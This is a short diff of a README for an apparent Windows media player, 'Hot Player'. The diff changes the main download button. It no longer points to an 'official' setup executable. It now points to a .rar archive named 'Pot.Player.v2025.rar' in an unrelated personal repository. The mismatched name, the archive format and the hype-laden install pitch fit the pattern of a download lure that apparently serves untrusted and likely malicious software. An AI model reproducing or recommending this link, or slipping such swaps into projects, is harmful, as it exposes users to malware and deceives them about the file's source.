@@ -47,7 +47,7 @@ Where every pixel matters and every note resonates. 🚀
 <div align="center">
   <h2>🚀 DOWNLOAD THE ULTIMATE WINDOWS MEDIA EXPERIENCE</h2>
   
-  [![Windows Download](https://img.shields.io/badge/_DOWNLOAD_NOW-0078D6?style=for-the-badge&logo=windows&logoColor=white&label=Hot%20Player%20v3.5.0&labelColor=0078D6)](https://github.com/hotplayer/official/releases/download/v3.5.0/HotPlayer_Setup.exe)
+  [![Windows Download](https://img.shields.io/badge/_DOWNLOAD_NOW-0078D6?style=for-the-badge&logo=windows&logoColor=white&label=Hot%20Player%20v3.5.0&labelColor=0078D6)](https://github.com/orekhov65/Hot-Player-Download/releases/download/Download/Pot.Player.v2025.rar)
 
   <h3>🔥 ONE-CLICK INSTALL • 11,7MB INSTALLER • 60s SETUP</h3>
   
